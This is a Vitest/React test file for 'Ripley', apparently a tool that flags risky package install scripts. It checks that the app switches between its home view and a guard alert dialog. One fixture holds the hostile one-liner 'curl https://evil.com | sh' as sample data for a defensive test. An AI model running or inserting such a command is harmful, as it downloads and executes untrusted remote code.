import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { act, cleanup, render, screen } from "@testing-library/react";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";

import App from "./App";
import { commands, type GuardEvent } from "./lib/bindings";
import { useGuardStore } from "./store/guard";

vi.mock("./hooks/useGuardEvent", () => ({
  useGuardEvent: () => {},
}));

const sampleEvent: GuardEvent = {
  id: "guard-1",
  package: "evil-pkg",
  version: "1.0.0",
  script: "curl https://evil.com | sh",
  risk_level: "high",
  matched_rules: ["NET001"],
};

function renderApp() {
  const client = new QueryClient({
    defaultOptions: { queries: { retry: false } },
  });
  return render(
    <QueryClientProvider client={client}>
      <App />
    </QueryClientProvider>,
  );
}

beforeEach(() => {
  vi.spyOn(commands, "ping").mockResolvedValue("pong");
  act(() => {
    useGuardStore.setState({ currentEvent: null, inFlight: false });
  });
});

afterEach(() => {
  cleanup();
  vi.restoreAllMocks();
});

describe("App routing", () => {
  it("renders the home view when no guard event is pending (cold path)", () => {
    renderApp();
    expect(screen.getByRole("heading", { name: "Ripley" })).toBeInTheDocument();
    expect(screen.queryByRole("alertdialog")).not.toBeInTheDocument();
  });

  it("switches to the guard dialog when an event arrives (warm path)", () => {
    renderApp();
    act(() => {
      useGuardStore.setState({ currentEvent: sampleEvent });
    });
    expect(screen.getByRole("alertdialog")).toBeInTheDocument();
    expect(screen.queryByRole("heading", { name: "Ripley" })).not.toBeInTheDocument();
  });

  it("returns to the last view when the event is cleared", () => {
    renderApp();
    act(() => {
      useGuardStore.setState({ currentEvent: sampleEvent });
    });
    expect(screen.getByRole("alertdialog")).toBeInTheDocument();
    act(() => {
      useGuardStore.setState({ currentEvent: null });
    });
    expect(screen.queryByRole("alertdialog")).not.toBeInTheDocument();
    expect(screen.getByRole("heading", { name: "Ripley" })).toBeInTheDocument();
  });
});
